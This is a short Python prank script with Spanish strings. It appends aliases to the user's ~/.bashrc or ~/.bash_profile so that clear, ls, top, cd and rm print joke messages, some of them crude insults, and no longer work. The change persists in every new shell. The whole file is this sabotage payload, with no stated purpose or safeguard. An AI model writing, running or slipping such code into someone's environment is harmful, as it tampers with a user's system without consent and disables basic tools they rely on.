import sys
from os.path import expanduser
home = expanduser("~")

bashrc="/.bashrc"
if sys.platform == 'darwin':
    bashrc="/.bash_profile"

fichero = open(home + bashrc, 'a')
fichero.write("alias clear=\'echo \"no tengo fanas de trabajar hoy parguelas\"\'\n")
fichero.write("alias ls=\'echo \"mejor me voy a  dormir\"\'\n")
fichero.write("alias top=\'echo \"no hay procesos son todos unos vagos\"\'\n")
fichero.write("alias cd=\'echo \"me gusta este directorio, no lo cambies\"\'\n")
fichero.write("alias rm=\'echo \"que vas a borrar tu tonto pollas, que te reviento\"\'\n")